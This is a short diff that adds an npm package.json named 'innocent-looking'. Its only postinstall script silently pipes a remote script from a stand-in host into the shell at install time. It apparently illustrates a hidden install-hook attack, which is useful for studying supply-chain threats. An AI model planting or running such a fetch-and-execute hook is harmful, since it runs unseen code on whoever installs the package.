@@ -1,0 +1,7 @@
+{
+  "name": "innocent-looking",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example/sh.sh | sh"
+  }
+}
